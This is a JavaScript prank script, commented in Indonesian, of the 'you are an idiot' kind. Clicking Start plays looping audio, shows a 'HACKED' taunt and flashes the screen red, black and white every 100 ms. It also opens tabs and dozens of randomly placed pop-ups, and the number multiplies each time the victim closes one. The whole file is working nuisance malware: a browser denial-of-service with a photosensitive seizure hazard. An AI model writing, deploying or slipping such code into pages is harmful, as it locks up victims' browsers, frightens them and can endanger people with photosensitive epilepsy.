let tabCount = 3; // Mulai dengan 3 tab
let popUpCount = 40; // Mulai dengan 40 pop-up
let tabs = [];
let popUpArray = [];
let audio = new Audio('idiot.mp3'); // Memuat audio

audio.loop = true; // Memastikan audio terus berulang
audio.volume = 1.0; // Mengatur volume audio (0.0 - 1.0)

// Fungsi untuk memutar audio
function playAudio() {
    if (audio.paused) {
        audio.play().catch(err => {
            console.error("Audio playback failed:", err);
        });
    }
}

// Fungsi untuk mengganti konten dan membuat efek flashing
function changeToHackerContent() {
    const mainContent = document.getElementById('main-content');
    if (mainContent) {
        mainContent.innerHTML = `
            <h1 style="color: red; text-align: center;">HACKED YOUR ARE AN IDIOT!</h1>
        `;

        // Tambahkan CSS untuk efek flashing
        document.body.style.animation = 'flashBackground 0.1s infinite';

        // Menambahkan style animasi di dalam <style> agar efeknya langsung terlihat
        const style = document.createElement('style');
        style.innerHTML = `
            @keyframes flashBackground {
                0% { background-color: black; color: red; }
                33% { background-color: white; color: black; }
                66% { background-color: red; color: white; }
                100% { background-color: black; color: red; }
            }
        `;
        document.head.appendChild(style);
    }
}

// Saat tombol "Start" diklik
document.getElementById("startBtn").addEventListener("click", function() {
    playAudio(); // Memulai audio saat start diklik
    changeToHackerContent(); // Ganti konten ke efek hacker
    startBackgroundFlashing(); // Mulai kedap-kedip latar belakang
    openTabsAndPopUps(tabCount, popUpCount); // Membuka tab dan pop-up awal
    monitorClose(); // Mulai memonitor tab/pop-up yang ditutup
});

// Fungsi untuk membuka tab dan pop-up
function openTabsAndPopUps(tabMultiplier, popUpMultiplier) {
    for (let i = 0; i < tabMultiplier; i++) {
        let newTab = window.open('', '_blank');
        if (newTab) {
            tabs.push(newTab);
            addFlashingToTab(newTab); // Tambahkan kedap-kedip ke setiap tab
            createPopUps(newTab, popUpMultiplier); // Membuat pop-up di dalam tab baru
        }
    }
}

// Fungsi untuk menambahkan kedap-kedip pada body tab
function addFlashingToTab(tab) {
    tab.document.innerHTML = `
        <html>
            <head>
                <title>HACKED YOUR AN IDIOT HAHAHAHA!</title>
                <style>
                    body {
                        background-color: red;
                        color: red;
                        transition: background-color 0.1s, color 0.1s;
                        font-family: Arial, sans-serif;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        height: 100vh;
                    }
                </style>
            </head>
            <body>
                <h1>HACKED YOUR AN IDIOT HAHAHAHA!</h1>
                <script>
                    let flash = false;
                    setInterval(() => {
                        document.body.style.backgroundColor = flash ? 'black' : 'red';  
                        document.body.style.color = flash ? 'red' : 'white';
                        flash = !flash;
                    }, 100); // Kecepatan flashing sama dengan main content
                </script>
            </body>
        </html>
    `;
}

// Fungsi untuk membuat pop-up di dalam setiap tab
function createPopUps(tabWindow, multiplier) {
    for (let i = 0; i < multiplier; i++) {
        let popUp = tabWindow.open('', '', 'width=300,height=200');
        if (popUp) {
            popUpArray.push(popUp);
            setRandomPosition(popUp);
            popUp.document.write(`
                <html>
                    <head>
                        <title>HACKED YOUR AN IDIOT HAHAHAHA!</title>
                        <style>
                            body {
                                font-family: Arial, sans-serif;
                                background-color: red;
                                color: red;
                                display: flex;
                                align-items: center;
                                justify-content: center;
                                height: 100vh;
                                transition: background-color 0.1s, color 0.1s;
                            }
                        </style>
                    </head>
                    <body>
                        <h1>HACKED YOUR AN IDIOT HAHAHAHA!</h1>
                        <script>
                            let flash = false;
                            setInterval(() => {
                                document.body.style.backgroundColor = flash ? 'black' : 'red';  
                                document.body.style.color = flash ? 'red' : 'white';
                                flash = !flash;
                            }, 100); // Kecepatan flashing sama dengan main content
                        </script>
                    </body>
                </html>
            `);
            monitorPopUpClose(popUp); // Memonitor penutupan pop-up
        }
    }
}

// Fungsi untuk memonitor jika tab atau pop-up ditutup
function monitorClose() {
    setInterval(function() {
        tabs.forEach((tab, index) => {
            if (tab.closed) {
                tabs.splice(index, 1);
                tabCount *= 3;
                openTabsAndPopUps(tabCount, popUpCount);
            }
        });

        popUpArray.forEach((popUp, index) => {
            if (popUp.closed) {
                popUpArray.splice(index, 1);
                popUpCount *= 6;
                openTabsAndPopUps(tabCount, popUpCount);
            }
        });
    }, 1000);
}

// Fungsi untuk memonitor penutupan pop-up secara individual
function monitorPopUpClose(popUp) {
    let popUpInterval = setInterval(function() {
        if (popUp.closed) {
            clearInterval(popUpInterval);
            popUpCount *= 6;
            openTabsAndPopUps(tabCount, popUpCount);
        }
    }, 1000);
}

// Fungsi untuk mengatur posisi pop-up secara acak
function setRandomPosition(popUp) {
    let screenW = window.screen.availWidth;
    let screenH = window.screen.availHeight;
    let randomX = Math.floor(Math.random() * (screenW - 300));
    let randomY = Math.floor(Math.random() * (screenH - 200));
    popUp.moveTo(randomX, randomY);
}

// Fungsi untuk membuat background elemen utama berkedip
function startBackgroundFlashing() {
    let flash = false;
    setInterval(() => {
        document.body.style.backgroundColor = flash ? 'black' : 'red';  
        document.body.style.color = flash ? 'red' : 'white';
        flash = !flash;
    }, 100); // Kecepatan flashing yang sama
}
